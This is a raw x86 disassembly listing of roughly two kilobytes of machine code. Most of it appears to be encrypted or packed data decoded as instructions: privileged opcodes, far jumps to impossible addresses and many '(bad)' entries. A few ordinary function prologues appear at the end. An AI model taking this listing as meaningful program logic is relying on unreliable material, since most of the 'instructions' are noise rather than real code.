  414697:	xor    eax,0x407f6a42
  41469c:	or     DWORD PTR [eax+0xfbe4452],esi
  4146a2:	aad    0xf9
  4146a4:	lea    ebp,[edx]
  4146a6:	mul    edx
  4146a8:	xchg   edi,eax
  4146a9:	mov    DWORD PTR [esi],ecx
  4146ab:	xchg   esi,ecx
  4146ad:	mov    ebp,0x74dd3739
  4146b2:	cwde   
  4146b3:	dec    ebp
  4146b4:	or     DWORD PTR [esi-0x69],ebx
  4146b7:	nop
  4146b8:	sti    
  4146b9:	mov    ebx,0xb602ade6
  4146be:	scas   eax,DWORD PTR es:[edi]
  4146bf:	jbe    0x4146dc
  4146c1:	fsubr  DWORD PTR [ecx+0x64]
  4146c4:	cmp    al,0x3c
  4146c6:	cmp    eax,0x374c105a
  4146cb:	ret    
  4146cc:	sub    eax,DWORD PTR [ebx]
  4146ce:	pushf  
  4146cf:	mov    ah,0x51
  4146d1:	into   
  4146d2:	outs   dx,BYTE PTR ds:[esi]
  4146d3:	cmp    al,BYTE PTR [ecx+eax*8-0x69]
  4146d7:	cmp    DWORD PTR [ebx],ecx
  4146d9:	idiv   bl
  4146db:	pop    esi
  4146dc:	xchg   esi,eax
  4146dd:	pop    edx
  4146de:	lahf   
  4146df:	mov    WORD PTR [ecx+0x3a12c0a],?
  4146e5:	test   BYTE PTR [ecx-0x6],ah
  4146e8:	xchg   edx,eax
  4146e9:	stos   DWORD PTR es:[edi],eax
  4146ea:	popa   
  4146eb:	cmp    ebx,DWORD PTR [edi+ebp*8+0x6]
  4146ef:	outs   dx,BYTE PTR ds:[esi]
  4146f0:	xor    DWORD PTR [ecx+ebx*4+0x55],0xf24b5e4b
  4146f8:	cli    
  4146f9:	cmp    DWORD PTR [ebx+0x1e],ebp
  4146fc:	mov    eax,ds:0x94f685fd
  414701:	pushf  
  414702:	retf   
  414703:	jge    0x414721
  414705:	lds    ecx,FWORD PTR [edi+0x146708ff]
  41470b:	pop    ecx
  41470c:	imul   edx,esp,0x5f
  41470f:	jbe    0x41476f
  414711:	ins    DWORD PTR es:[edi],dx
  414712:	mov    edx,0x412c7ed7
  414717:	or     al,0xd
  414719:	cdq    
  41471a:	je     0x4146a5
  41471c:	add    eax,0xd2653d26
  414721:	das    
  414722:	jp     0x41478c
  414724:	mov    ebx,0x690781db
  414729:	mov    esp,0x5f488c9a
  41472e:	stc    
  41472f:	pop    esp
  414730:	sub    DWORD PTR [edi+0x0],edi
  414733:	mov    ch,0x19
  414735:	jmp    0x694e0b20
  41473a:	dec    edi
  41473b:	outs   dx,DWORD PTR ds:[esi]
  41473c:	jb     0x4146dd
  41473e:	cmc    
  41473f:	imul   esp,DWORD PTR [edx-0x47d4a7b7],0x2e5f1e63
  414749:	pop    eax
  41474a:	cmp    bh,BYTE PTR [edi+0x11fa9a5]
  414750:	jns    0x4147ac
  414752:	push   ds
  414753:	sub    ah,BYTE PTR [esp+ecx*4]
  414756:	jp     0x414783
  414758:	mov    eax,DWORD PTR [esi-0x15]
  41475b:	in     eax,dx
  41475c:	jp     0x414720
  41475e:	xor    al,0xba
  414760:	in     al,dx
  414761:	cmp    ch,bh
  414763:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414764:	push   ebp
  414765:	mov    ah,0xd2
  414767:	aas    
  414768:	pop    ebp
  414769:	adc    BYTE PTR [ecx+ebp*4-0x47480921],dl
  414770:	and    eax,0x4ba73d9c
  414775:	add    eax,0x76d4fdda
  41477b:	ins    DWORD PTR es:[edi],dx
  41477c:	sbb    eax,0x2892a711
  414781:	add    eax,0x292bbbd2
  414786:	retf   
  414787:	jecxz  0x4147b7
  414789:	mov    esi,0xde390af9
  41478e:	popa   
  41478f:	push   esi
  414790:	xchg   DWORD PTR [eax+0x3d],ebp
  414793:	mov    eax,0xce6e814
  414798:	adc    eax,0xd06d0128
  41479d:	jmp    0xd8f3:0x353f056
  4147a4:	rcl    BYTE PTR [esi],0x69
  4147a7:	je     0x414755
  4147a9:	dec    ecx
  4147aa:	aad    0xee
  4147ac:	mov    ah,0x25
  4147ae:	popa   
  4147af:	adc    bl,BYTE PTR [ecx-0x74bcaf9]
  4147b5:	popa   
  4147b6:	xor    DWORD PTR [ecx+0x735c26a9],ebp
  4147bc:	shr    BYTE PTR [ebx],0x8a
  4147bf:	fisttp QWORD PTR [eax-0x7b]
  4147c2:	or     al,0x91
  4147c4:	call   0xb1bb:0xf584aea0
  4147cb:	call   0x33e:0x21b97db4
  4147d2:	mov    ds:0x487ce569,eax
  4147d7:	lahf   
  4147d8:	jns    0x414842
  4147da:	je     0x414832
  4147dc:	(bad)  
  4147de:	inc    eax
  4147df:	cld    
  4147e0:	xor    cl,BYTE PTR [ebp+0x38d9a1bf]
  4147e6:	pop    ecx
  4147e7:	shr    ebp,0xba
  4147ea:	or     edi,DWORD PTR [ebx]
  4147ec:	shr    BYTE PTR [ecx],0x8f
  4147ef:	jle    0x41478f
  4147f1:	sub    dh,0x27
  4147f4:	jl     0x41486c
  4147f6:	jne    0x41481f
  4147f8:	das    
  4147f9:	xchg   esp,eax
  4147fa:	jp     0x41484d
  4147fc:	or     ah,BYTE PTR [eax]
  4147fe:	push   cs
  4147ff:	jmp    0x9a216198
  414804:	ins    BYTE PTR es:[edi],dx
  414805:	push   0x80e173a6
  41480a:	jne    0x4147d3
  41480c:	outs   dx,DWORD PTR ds:[esi]
  41480d:	mov    cl,0xe5
  41480f:	mov    edx,0x28d5f75c
  414814:	out    dx,eax
  414815:	repnz mov ch,0x60
  414818:	jns    0x414876
  41481a:	adc    BYTE PTR [esi+esi*8+0xa4d7739],dh
  414821:	fstp   DWORD PTR [esi+0x7ccaeb3b]
  414827:	add    eax,0xea1c2f39
  41482c:	pop    ecx
  41482d:	and    bh,ah
  41482f:	sbb    DWORD PTR [esi+0x1b51bfce],edx
  414835:	ja     0x41486c
  414837:	sub    bl,BYTE PTR [ebp+0xa]
  41483a:	jp     0x414865
  41483c:	mov    DWORD PTR [ebp-0x37],edx
  41483f:	push   ebp
  414840:	fistp  QWORD PTR [eax+0x49075a4e]
  414846:	bound  edx,QWORD PTR [ecx+0x30416992]
  41484c:	popf   
  41484d:	enter  0x681a,0xb2
  414851:	pop    ss
  414852:	mov    edx,0xe0c07d5c
  414857:	mov    cl,0x2a
  414859:	and    eax,0x605c370f
  41485e:	push   ebx
  41485f:	mov    dh,0x46
  414861:	cmp    DWORD PTR [edi+0x7db74452],esi
  414867:	iret   
  414868:	mov    ebx,0xb9babed
  41486d:	mov    dh,0x26
  41486f:	int    0x8c
  414871:	aaa    
  414872:	pop    ebp
  414873:	jl     0x4148cc
  414875:	cmp    ch,bl
  414877:	pop    esi
  414878:	ficomp WORD PTR [edx-0x7e]
  41487b:	outs   dx,BYTE PTR ds:[si]
  41487d:	sbb    DWORD PTR [esi+ebp*1+0x47],0xdb86e444
  414885:	hlt    
  414886:	jae    0x41482a
  414888:	int3   
  414889:	and    bp,ax
  41488c:	inc    ebx
  41488d:	retf   0xc8bf
  414890:	icebp  
  414891:	sbb    bh,cl
  414893:	stos   DWORD PTR es:[edi],eax
  414894:	xor    al,0xcc
  414896:	mov    edi,0x5f11c1b8
  41489b:	adc    eax,0xae1aa17
  4148a0:	mov    ds:0x700e9631,al
  4148a5:	or     ch,cl
  4148a7:	push   edx
  4148a8:	nop
  4148a9:	push   ebx
  4148aa:	push   ebx
  4148ab:	xchg   BYTE PTR [edi+0x5940d058],dl
  4148b1:	sub    al,0x7
  4148b3:	repnz shl bh,0x8
  4148b7:	add    edi,esp
  4148b9:	int    0x94
  4148bb:	or     BYTE PTR [ebx],bl
  4148bd:	pop    es
  4148be:	and    BYTE PTR [ebx+0x0],bh
  4148c1:	jbe    0x4148bc
  4148c3:	pop    eax
  4148c4:	xchg   edx,eax
  4148c5:	fcom   DWORD PTR [edx]
  4148c7:	mov    BYTE PTR [eax-0x2f],cl
  4148ca:	pop    ss
  4148cb:	fdivr  st(7),st
  4148cd:	add    dl,dh
  4148cf:	sbb    edx,ecx
  4148d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148d2:	jp     0x41490d
  4148d4:	mov    al,0x77
  4148d6:	les    edx,FWORD PTR [eax-0x54f52f64]
  4148dc:	add    al,0x6f
  4148de:	jge    0x414920
  4148e0:	fist   WORD PTR [eax]
  4148e2:	sub    eax,0x372df1f8
  4148e7:	xchg   ecx,eax
  4148e8:	mov    ecx,DWORD PTR [edx+0x2]
  4148eb:	idiv   bh
  4148ed:	adc    ch,BYTE PTR ds:[edi]
  4148f0:	jns    0x414938
  4148f2:	cs jmp 0x41496b
  4148f5:	sbb    BYTE PTR [esp+edi*4+0x2a],dh
  4148f9:	pop    ebp
  4148fa:	scas   al,BYTE PTR es:[edi]
  4148fb:	cmp    al,BYTE PTR [ebp-0x30ea9714]
  414901:	mov    edi,0xba8e38ed
  414906:	dec    esi
  414907:	(bad)  
  414908:	jecxz  0x41493d
  41490a:	mov    ch,0x3c
  41490c:	jne    0x41498a
  41490e:	sub    edi,edi
  414910:	sub    ah,BYTE PTR [edx+0x7e]
  414913:	pushf  
  414914:	inc    ebx
  414915:	sbb    BYTE PTR [ebx+0x13],bh
  414918:	(bad)  
  414919:	imul   esi,ebx,0xfebc0cae
  41491f:	fstp   TBYTE PTR [ecx]
  414921:	adc    ebx,DWORD PTR [edi]
  414923:	dec    edx
  414924:	ds mov ah,0x92
  414927:	rol    BYTE PTR [ecx],cl
  414929:	mov    esi,0x43d387f8
  41492e:	push   ebx
  41492f:	pop    eax
  414930:	call   DWORD PTR [eax-0x1]
  414933:	mov    eax,DWORD PTR [ebp-0x38]
  414936:	mov    ecx,DWORD PTR ds:0x426b5e
  41493c:	add    DWORD PTR [eax],ecx
  41493e:	pop    edi
  41493f:	jmp    0x414e4a
  414944:	(bad)  
  414945:	rol    ah,1
  414947:	int3   
  414948:	fcmove st,st(4)
  41494a:	(bad)  
  41494b:	fimul  DWORD PTR [ebp-0x107ce223]
  414951:	fst    QWORD PTR [edx]
  414953:	mov    bh,0xb2
  414955:	and    al,0x7f
  414957:	js     0x4149c3
  414959:	jl     0x4149d3
  41495b:	js     0x41490d
  41495d:	scas   eax,DWORD PTR es:[edi]
  41495e:	arpl   sp,cx
  414960:	push   ecx
  414961:	jb     0x414921
  414963:	cmp    ch,BYTE PTR [ecx+0x29ffb224]
  414969:	out    dx,al
  41496a:	fdiv   DWORD PTR [ebx-0x27]
  41496d:	xor    eax,0x5ecf929
  414972:	cmp    al,BYTE PTR [esi]
  414974:	mov    esi,0x3ab7a089
  414979:	aam    0x8
  41497b:	int3   
  41497c:	jne    0x4149b7
  41497e:	or     BYTE PTR [edx+0x4c],dl
  414981:	and    eax,0xe50b90d0
  414986:	sbb    al,0x74
  414988:	arpl   WORD PTR [ebx],ax
  41498a:	xchg   edi,eax
  41498b:	out    dx,al
  41498c:	mov    bl,0x4a
  41498e:	push   edx
  41498f:	mov    ds:0xd71b5d66,al
  414994:	push   0xffffff84
  414996:	adc    DWORD PTR [esp+esi*2],0x198a9510
  41499d:	outs   dx,BYTE PTR ds:[esi]
  41499e:	adc    ch,BYTE PTR [edx+0x2844f96c]
  4149a4:	xchg   ebp,eax
  4149a5:	mov    ebx,0xf5b8f811
  4149aa:	push   esi
  4149ab:	hlt    
  4149ac:	sub    esp,edx
  4149ae:	inc    esp
  4149af:	pop    esi
  4149b0:	dec    edx
  4149b1:	ja     0x4149fb
  4149b3:	lds    esp,FWORD PTR [edi]
  4149b5:	push   0xffffffc6
  4149b7:	mov    ah,0x6b
  4149b9:	loopne 0x414975
  4149bb:	mov    dl,dl
  4149bd:	mov    WORD PTR [esi-0x1c91283a],gs
  4149c3:	sbb    dh,BYTE PTR [ebp+0x1ea40b7]
  4149c9:	sbb    edx,DWORD PTR [edi]
  4149cb:	dec    edi
  4149cd:	mov    ebp,0x86e00e83
  4149d2:	pop    ebx
  4149d3:	dec    ebp
  4149d4:	cdq    
  4149d5:	xchg   ebx,eax
  4149d6:	ja     0x414997
  4149d8:	repnz (bad) 
  4149da:	sahf   
  4149db:	xor    ch,ch
  4149dd:	jge    0x414a30
  4149df:	cmp    eax,DWORD PTR [ecx+0xd23c1c5]
  4149e5:	ins    BYTE PTR es:[edi],dx
  4149e6:	and    eax,0x4a8a68ee
  4149eb:	xor    al,0x94
  4149ed:	daa    
  4149ee:	test   bl,bh
  4149f0:	fcom   st(6)
  4149f2:	nop
  4149f3:	sbb    al,0xc3
  4149f5:	xlat   BYTE PTR ds:[ebx]
  4149f6:	cmp    DWORD PTR [ebp-0x21],edx
  4149f9:	and    al,0x5e
  4149fb:	push   edi
  4149fc:	imul   edx,DWORD PTR cs:[edx-0x3d96b511],0x2e54580
  414a07:	ja     0x414a51
  414a09:	adc    eax,0x1d4ac507
  414a0e:	(bad)  
  414a0f:	mov    ds:0x32c34d26,eax
  414a14:	sahf   
  414a15:	jae    0x414a68
  414a17:	cmp    DWORD PTR [edx-0x75],ebx
  414a1a:	retf   0x6eb4
  414a1d:	int    0x8e
  414a1f:	jmp    0xe5ed:0x8d941b7a
  414a26:	(bad)  
  414a27:	(bad)  
  414a29:	test   BYTE PTR [esi],ch
  414a2b:	lock idiv DWORD PTR [esp+eax*8-0xdde16f]
  414a33:	jecxz  0x414a1f
  414a35:	aas    
  414a36:	mov    eax,DWORD PTR [esi]
  414a38:	mov    dl,cl
  414a3a:	adc    al,BYTE PTR [ebp-0x5a64bae0]
  414a40:	test   DWORD PTR [ebx-0x480c5f5d],eax
  414a46:	xchg   ecx,eax
  414a47:	nop
  414a48:	mov    ebp,0x730b0963
  414a4d:	jmp    0x72e233a2
  414a52:	sti    
  414a53:	sub    ah,ch
  414a55:	in     eax,0xf5
  414a57:	vmwrite ebx,DWORD PTR [ecx-0x5fe88d17]
  414a5e:	fsqrt  
  414a60:	jg     0x414ad1
  414a62:	jo     0x414a48
  414a64:	cdq    
  414a65:	sub    DWORD PTR [edx-0x19],esp
  414a68:	sub    bl,BYTE PTR [edx]
  414a6a:	hlt    
  414a6b:	pop    ebp
  414a6c:	pop    edx
  414a6d:	xor    DWORD PTR [ecx+eiz*2+0x33322052],eax
  414a74:	scas   al,BYTE PTR es:[edi]
  414a75:	mov    ebp,0x937469f6
  414a7a:	popf   
  414a7b:	or     ch,dl
  414a7d:	sbb    eax,0x6de7bda7
  414a82:	pop    es
  414a83:	inc    edx
  414a84:	sahf   
  414a85:	gs ja  0x414a43
  414a88:	test   eax,0x4006d8d8
  414a8d:	mov    edi,0xa748822c
  414a92:	in     al,0x54
  414a94:	lods   eax,DWORD PTR ds:[esi]
  414a95:	jge    0x414ad7
  414a97:	fwait
  414a98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a99:	lahf   
  414a9a:	fnstsw WORD PTR [edx+0x15]
  414a9d:	push   ebp
  414a9e:	mov    esi,0x152621c5
  414aa3:	push   0x7e8d637
  414aa8:	sbb    eax,edi
  414aaa:	sbb    eax,0x38de54be
  414aaf:	vpmuludq ymm1,ymm1,ymm0
  414ab3:	test   al,0xef
  414ab5:	xor    BYTE PTR [edx+0x1bc2eb5a],al
  414abb:	pop    ds
  414abc:	adc    DWORD PTR [eax-0x7a4cee72],eax
  414ac2:	pop    ebp
  414ac3:	outs   dx,BYTE PTR ds:[esi]
  414ac4:	cli    
  414ac5:	xor    edi,ebp
  414ac7:	lock aam 0xb1
  414aca:	test   al,0xd4
  414acc:	dec    ebx
  414acd:	shr    DWORD PTR [edi-0x25c527d7],1
  414ad3:	or     esp,DWORD PTR [edx+0x2dc8d8e0]
  414ad9:	ret    
  414ada:	add    esp,DWORD PTR [ebx+0x72]
  414add:	fdivp  st(1),st
  414adf:	xor    DWORD PTR cs:[esi+0x39],edi
  414ae3:	pusha  
  414ae4:	xor    esp,esi
  414ae6:	mov    dh,0x94
  414ae8:	and    al,0x90
  414aea:	mov    ds:0xc3f8be16,eax
  414aef:	mov    DWORD PTR [ebx+edi*1+0x5f],esp
  414af3:	cmp    eax,0xab715f2b
  414af8:	popf   
  414af9:	jae    0x414ad5
  414afb:	or     DWORD PTR [ecx-0x2b771ad7],0x70
  414b02:	sbb    BYTE PTR [ebx-0x7c],cl
  414b05:	shr    esi,1
  414b07:	and    edi,edi
  414b09:	aad    0x8c
  414b0b:	pop    ds
  414b0c:	sti    
  414b0d:	test   DWORD PTR [edi-0x64],esp
  414b10:	mov    bl,BYTE PTR [ebx-0x1d5727cf]
  414b16:	loope  0x414b55
  414b18:	xor    al,0x31
  414b1b:	leave  
  414b1c:	out    0x70,eax
  414b1e:	cmp    dh,bl
  414b20:	xor    bl,0xbc
  414b23:	mov    dl,0xa2
  414b25:	das    
  414b26:	sbb    al,0x8a
  414b28:	xchg   ebx,eax
  414b29:	not    DWORD PTR [esi+eax*1+0xc645fa5]
  414b30:	push   cs
  414b31:	push   0xffffffb6
  414b33:	push   esi
  414b34:	pusha  
  414b35:	shrd   DWORD PTR [esi+0x6de2dfad],ecx,cl
  414b3c:	or     DWORD PTR [esi+ecx*4],ebp
  414b3f:	ret    0xaff2
  414b42:	scas   eax,DWORD PTR es:[edi]
  414b43:	loopne 0x414bac
  414b45:	sub    bh,BYTE PTR [ebp-0x72feb7f2]
  414b4b:	aaa    
  414b4c:	jo     0x414ae2
  414b4e:	gs out 0xdd,al
  414b51:	xor    DWORD PTR [ebx],ebp
  414b53:	mov    BYTE PTR [ecx+0x6947c1b6],ah
  414b59:	sub    bh,BYTE PTR [esi]
  414b5b:	clc    
  414b5c:	enter  0x3f09,0x4f
  414b60:	mov    eax,ds:0x35c5ae5d
  414b65:	mov    ecx,0x103cf6a2
  414b6a:	fmul   QWORD PTR [eax+0x106df5ef]
  414b70:	test   al,0x48
  414b72:	stos   DWORD PTR es:[edi],eax
  414b73:	sbb    eax,0xb418d955
  414b78:	mov    cl,0xbf
  414b7a:	push   ds
  414b7b:	lods   eax,DWORD PTR ds:[esi]
  414b7c:	adc    al,0xde
  414b7e:	and    DWORD PTR [esi],edx
  414b80:	(bad)  
  414b82:	and    BYTE PTR [edi-0x56],ch
  414b85:	cdq    
  414b86:	das    
  414b87:	sub    ch,cl
  414b89:	push   ds
  414b8a:	fdivr  QWORD PTR [ebx-0x7e]
  414b8d:	xchg   ecx,eax
  414b8e:	pandn  mm5,QWORD PTR [eax]
  414b91:	inc    ebx
  414b92:	pop    esi
  414b93:	stos   BYTE PTR es:[edi],al
  414b94:	cdq    
  414b95:	or     BYTE PTR [ecx+0x35],bh
  414b98:	or     ecx,DWORD PTR [edx+ebp*2-0x27f42df2]
  414b9f:	test   al,0x15
  414ba1:	arpl   ax,di
  414ba3:	add    esi,DWORD PTR es:[edi+0x3e7a5096]
  414baa:	pop    edx
  414bab:	dec    ebx
  414bac:	lock jecxz 0x414b77
  414baf:	pop    ds
  414bb0:	nop
  414bb1:	jle    0x414b4e
  414bb3:	mov    ebx,0x20bee0de
  414bb8:	call   0x7017:0xb2ed502c
  414bbf:	call   0x1ab7ed98
  414bc4:	scas   eax,DWORD PTR es:[edi]
  414bc5:	push   cs
  414bc6:	sub    dl,ch
  414bc8:	sub    BYTE PTR [eiz*2+0x4047d5ae],ch
  414bcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bd0:	mov    ebp,0x2d149cf6
  414bd5:	sbb    bl,BYTE PTR [edi+0x6a038373]
  414bdb:	repnz out 0x78,al
  414bde:	adc    dh,cl
  414be0:	retf   
  414be1:	cdq    
  414be2:	pop    eax
  414be3:	das    
  414be4:	xchg   esp,eax
  414be5:	popa   
  414be6:	call   DWORD PTR [eax+0x30793df8]
  414bec:	pop    ebp
  414bed:	jb     0x414beb
  414bef:	sbb    eax,0xed4251af
  414bf4:	mov    WORD PTR [eax-0x35ad873e],gs
  414bfa:	dec    edi
  414bfb:	pusha  
  414bfc:	loope  0x414c2c
  414bfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bff:	ds pusha 
  414c01:	retf   
  414c02:	loope  0x414c62
  414c04:	std    
  414c05:	div    WORD PTR [ebx+0x115bf69c]
  414c0c:	popf   
  414c0d:	inc    esp
  414c0e:	jb     0x414be3
  414c10:	push   cs
  414c11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c12:	stos   DWORD PTR es:[edi],eax
  414c13:	push   ebp
  414c14:	(bad)  
  414c16:	fs in  eax,0x63
  414c19:	add    DWORD PTR [edi-0x37de6549],0xffffff93
  414c20:	mov    ds:0xb6c5cdc4,al
  414c25:	cli    
  414c26:	or     bl,ah
  414c28:	(bad)  
  414c29:	scas   eax,DWORD PTR es:[edi]
  414c2a:	and    dl,BYTE PTR [edi]
  414c2c:	mov    cl,0xa0
  414c2e:	pushf  
  414c2f:	cwde   
  414c30:	jbe    0x414bde
  414c32:	loope  0x414bc4
  414c34:	scas   al,BYTE PTR es:[edi]
  414c35:	cmp    DWORD PTR [edi],0x7fa24cdd
  414c3b:	pop    ds
  414c3c:	mov    edi,0x2df81760
  414c41:	pop    ebx
  414c42:	jmp    0xbd33f96a
  414c47:	xor    dh,BYTE PTR [ecx+ecx*2]
  414c4a:	lds    eax,FWORD PTR [ebx+edx*8]
  414c4d:	inc    edi
  414c4e:	adc    eax,0xf53d7cba
  414c53:	push   ds
  414c54:	push   es
  414c55:	sbb    bh,0xfa
  414c58:	aam    0xa
  414c5a:	cwde   
  414c5b:	push   ecx
  414c5c:	(bad)  
  414c5d:	push   esp
  414c5e:	dec    ecx
  414c5f:	cmp    DWORD PTR [edx],ebx
  414c61:	push   ebp
  414c62:	or     ebp,DWORD PTR [ebp-0x11]
  414c65:	sub    DWORD PTR [edi],esp
  414c67:	addr16 jg 0x414c4d
  414c6a:	pop    es
  414c6b:	push   esi
  414c6c:	mov    eax,ds:0x50a65446
  414c71:	sbb    bl,BYTE PTR [esi-0x3e9b0cd2]
  414c77:	xor    DWORD PTR [edx+0x21],eax
  414c7a:	mov    ebx,0x1c6c3822
  414c7f:	dec    ecx
  414c80:	int    0xe
  414c82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c83:	sub    eax,0x87084d75
  414c88:	(bad)  
  414c89:	mov    ?,esp
  414c8b:	mov    ecx,0xedd4d550
  414c90:	call   0x746d403
  414c95:	js     0x414c59
  414c97:	cs jb  0x414d15
  414c9a:	in     eax,0xee
  414c9c:	stos   DWORD PTR es:[edi],eax
  414c9d:	and    DWORD PTR [eax],esp
  414c9f:	cwde   
  414ca0:	add    bl,dl
  414ca2:	mov    DWORD PTR [esi-0x44],edi
  414ca5:	mov    bl,0xf2
  414ca7:	fcmovne st,st(1)
  414ca9:	ins    DWORD PTR es:[edi],dx
  414caa:	inc    esi
  414cab:	in     al,0xa8
  414cad:	outs   dx,BYTE PTR ds:[esi]
  414cae:	aas    
  414caf:	pop    esp
  414cb0:	iret   
  414cb1:	out    0x57,al
  414cb3:	and    ebp,eax
  414cb5:	or     eax,DWORD PTR [edx+0x44]
  414cb8:	dec    ebx
  414cb9:	mov    ebp,0x8b93b1f0
  414cbe:	test   BYTE PTR [esi+0x19],dl
  414cc1:	je     0x414c92
  414cc3:	mov    bh,BYTE PTR [ebp+0x29]
  414cc6:	daa    
  414cc7:	add    al,0xe5
  414cc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cca:	jb     0x414d38
  414ccc:	mov    ds:0x86a55faa,al
  414cd1:	aaa    
  414cd2:	cmc    
  414cd3:	push   ebx
  414cd4:	mov    eax,ds:0x73c01d54
  414cd9:	ins    BYTE PTR es:[edi],dx
  414cda:	mov    edi,0x42754dd1
  414cdf:	aaa    
  414ce0:	lods   al,BYTE PTR ds:[esi]
  414ce1:	add    DWORD PTR [ecx+0x5f],esi
  414ce4:	ret    
  414ce5:	cmc    
  414ce6:	push   es
  414ce7:	aad    0xac
  414ce9:	(bad)  
  414cea:	adc    dh,BYTE PTR [ebp+0x1d]
  414ced:	mov    dh,0x80
  414cef:	enter  0xee8d,0x1c
  414cf3:	adc    al,0x38
  414cf5:	push   ebx
  414cf6:	inc    esi
  414cf7:	adc    al,0x51
  414cf9:	cmp    al,0x25
  414cfb:	aas    
  414cfc:	and    DWORD PTR ds:0x124a9b20,eax
  414d02:	cli    
  414d03:	mov    ebx,0x45e5f7d2
  414d08:	rcl    bl,1
  414d0a:	xchg   ebp,eax
  414d0b:	jge    0x414d86
  414d0d:	pop    eax
  414d0e:	js     0x414cd2
  414d10:	jmp    0x414d08
  414d12:	rol    DWORD PTR [ebx+0x4ac3c07c],cl
  414d18:	fnstenv [ebx+0x21]
  414d1b:	addr16 test al,0xd9
  414d1e:	mov    dh,0x13
  414d20:	xor    eax,0xc8d4a0c2
  414d25:	add    eax,DWORD PTR [edi-0x1e]
  414d28:	addr16 aas 
  414d2a:	sub    dh,BYTE PTR [ebp-0x17]
  414d2d:	jbe    0x414da7
  414d2f:	pop    esi
  414d30:	mov    ebx,0xb10477e9
  414d35:	xchg   BYTE PTR [ebx+eiz*2-0x3e36987c],bh
  414d3c:	int3   
  414d3d:	js     0x414cd7
  414d3f:	outs   dx,BYTE PTR ds:[esi]
  414d40:	test   al,0x35
  414d42:	adc    al,0x1e
  414d44:	pusha  
  414d45:	std    
  414d46:	lods   eax,DWORD PTR ds:[esi]
  414d47:	mov    edx,0xa0556f21
  414d4c:	push   edx
  414d4d:	lods   al,BYTE PTR ds:[esi]
  414d4e:	and    al,0x9b
  414d50:	jg     0x414d33
  414d52:	pop    es
  414d53:	sbb    eax,0x8278ff5e
  414d58:	jbe    0x414d34
  414d5a:	cmp    DWORD PTR [ebx],esp
  414d5c:	xor    al,ch
  414d5e:	push   es
  414d5f:	jo     0x414dc2
  414d61:	push   esi
  414d62:	add    edx,0x2cc24def
  414d68:	inc    esi
  414d69:	repnz div BYTE PTR [edi]
  414d6c:	rol    BYTE PTR ds:0xaab6c84a,0x47
  414d73:	call   DWORD PTR [ecx-0x46c5b347]
  414d79:	push   edx
  414d7a:	push   ss
  414d7b:	loope  0x414d96
  414d7d:	mov    dl,BYTE PTR [edi]
  414d7f:	hlt    
  414d80:	push   ecx
  414d81:	(bad)  
  414d82:	leave  
  414d83:	cs in  al,0x6
  414d86:	call   DWORD PTR [edx+0x10]
  414d89:	dec    ecx
  414d8a:	push   ebx
  414d8b:	pop    esi
  414d8c:	inc    ebx
  414d8d:	dec    esi
  414d8e:	mov    dl,0xbd
  414d90:	push   es
  414d91:	push   eax
  414d92:	or     ecx,DWORD PTR [ecx+0x290db2f7]
  414d98:	fidivr WORD PTR [esi-0x43]
  414d9b:	sbb    BYTE PTR ds:0x736a30d5,0x42
  414da2:	dec    edx
  414da3:	cmc    
  414da4:	popf   
  414da5:	(bad)  
  414da6:	outs   dx,BYTE PTR ds:[esi]
  414da7:	push   ss
  414da8:	rcr    BYTE PTR [edi+0x9],cl
  414dab:	add    al,0xd0
  414dad:	mov    esp,0xbdd1c3ca
  414db2:	mov    eax,ds:0x219dd8a4
  414db7:	pop    esi
  414db8:	cwd    
  414dba:	mov    edx,0xefceebdd
  414dbf:	dec    eax
  414dc0:	xchg   esi,eax
  414dc1:	shl    DWORD PTR [ebp+0x4],cl
  414dc4:	add    al,0x11
  414dc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dc7:	mov    ecx,0x25534b8e
  414dcc:	ss cwde 
  414dce:	xchg   ecx,eax
  414dcf:	nop
  414dd0:	popf   
  414dd1:	pusha  
  414dd2:	sub    al,0xba
  414dd4:	shr    DWORD PTR [ecx-0x77],0x58
  414dd8:	adc    esi,DWORD PTR [esi-0x4a]
  414ddb:	daa    
  414ddc:	xchg   esp,eax
  414ddd:	daa    
  414dde:	mov    bl,0xa4
  414de0:	sub    eax,0x70ba9d62
  414de5:	fs leave 
  414de7:	aas    
  414de8:	aaa    
  414de9:	mov    al,0xdc
  414deb:	add    BYTE PTR [edi+0x56e74041],bh
  414df1:	in     al,0x96
  414df3:	shl    BYTE PTR [esi+ebp*4+0x204066b1],1
  414dfa:	xchg   BYTE PTR [ecx+ebp*2],ch
  414dfd:	int    0xdb
  414dff:	stc    
  414e00:	nop
  414e01:	jnp    0x414dad
  414e03:	fimul  WORD PTR [edi+0x344405bf]
  414e09:	xchg   edx,eax
  414e0a:	cdq    
  414e0b:	imul   ebp,DWORD PTR [esi],0x784fc399
  414e11:	mov    ds:0x68adfe39,al
  414e16:	cmp    al,0x10
  414e18:	pop    ds
  414e19:	in     eax,0x44
  414e1b:	rol    DWORD PTR [ebx+eax*1+0x4ff30bab],0xcd
  414e23:	sbb    al,0xe4
  414e25:	mov    bh,0xe6
  414e27:	rcr    BYTE PTR [edx],0x64
  414e2a:	mov    ecx,0x2b5bf508
  414e2f:	push   cs
  414e30:	jmpw   0x6dd9
  414e34:	or     cl,BYTE PTR [edx]
  414e36:	adc    bh,BYTE PTR [ecx]
  414e38:	ds xor ecx,0xaca5d0a2
  414e3f:	(bad)  
  414e40:	into   
  414e41:	push   ebp
  414e42:	(bad)
  414e46:	mov    ebp,0x5ecc408d
  414e4b:	pop    ebx
  414e4c:	leave  
  414e4d:	ret    
  414e4e:	push   ebp
  414e4f:	mov    ebp,esp
  414e51:	sub    esp,0x28
  414e54:	leave  
  414e55:	ret    0xc
  414e58:	push   ebp
  414e59:	mov    ebp,esp
  414e5b:	sub    esp,0x44
  414e5e:	and    DWORD PTR ds:0x42a409,0x0
  414e68:	xor    edx,edx
  414e6a:	or     edx,DWORD PTR ds:0x42a409
  414e70:	inc    edx
  414e71:	mov    DWORD PTR ds:0x42a409,edx
  414e77:	cmp    DWORD PTR ds:0x42a409,0x5
  414e7e:	jne    0x414e9e
  414e84:	push   0x4ddc
  414e89:	push   0x2786
